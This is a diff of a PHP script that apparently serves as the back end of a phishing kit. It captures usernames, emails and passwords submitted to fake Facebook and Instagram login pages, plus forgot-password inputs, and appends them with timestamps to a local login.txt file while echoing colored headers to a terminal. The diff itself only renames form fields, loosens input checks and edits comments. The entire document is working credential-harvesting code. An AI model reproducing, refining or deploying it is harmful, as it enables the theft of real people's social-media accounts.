@@ -1,23 +1,26 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Forgot Password Handler
-    if (isset($_POST['forgot_user']) && !isset($_POST['username']) && !isset($_POST['email'])) {
-        $input = trim($_POST['forgot_user']);
+    // FORGOT PASSWORD HANDLER
+    if (isset($_POST['user_input']) && empty($_POST['username']) && empty($_POST['email'])) {
+        $input = trim($_POST['user_input']);
         $label = "UNKNOWN";
 
+        // Identify the type
         if (filter_var($input, FILTER_VALIDATE_EMAIL)) {
             $label = "Email";
-        } elseif (preg_match("/^[0-9]{7,15}$/", $input)) {
+        } elseif (preg_match("/^\d{7,15}$/", $input)) {
             $label = "Phone";
-        } elseif (preg_match("/^[a-zA-Z0-9._]+$/", $input)) {
+        } else {
             $label = "Username";
         }
 
+        // Terminal colored log
         $header = "\033[36m==== [FORGOT PASSWORD] ====\033[0m\n";
         $log = "$label: $input\n";
         $log .= "Time: " . date("Y-m-d H:i:s") . "\n";
         $log .= "=============================\n\n";
 
+        // Save to file
         file_put_contents("login.txt", strip_tags($header . $log), FILE_APPEND);
 
         if (php_sapi_name() === 'cli') {
@@ -28,12 +31,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         exit();
     }
 
-    // Login Handler
+    // LOGIN HANDLER
     $user = $_POST['username'] ?? $_POST['email'] ?? 'UNKNOWN_USER';
     $pass = $_POST['password'] ?? $_POST['pass'] ?? 'UNKNOWN_PASS';
     $platform = isset($_POST['email']) ? "Facebook" : "Instagram";
 
-    // Colored log header
     $header = $platform === "Facebook"
         ? "\033[34m==== [Facebook Login] ====\033[0m\n"
         : "\033[35m==== [Instagram Login] ====\033[0m\n";
@@ -42,7 +44,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $log .= "Time: " . date("Y-m-d H:i:s") . "\n";
     $log .= "===========================\n\n";
 
-    // Save to file (strip color for file log)
     file_put_contents("login.txt", strip_tags($header . $log), FILE_APPEND);
 
     if (php_sapi_name() === 'cli') {
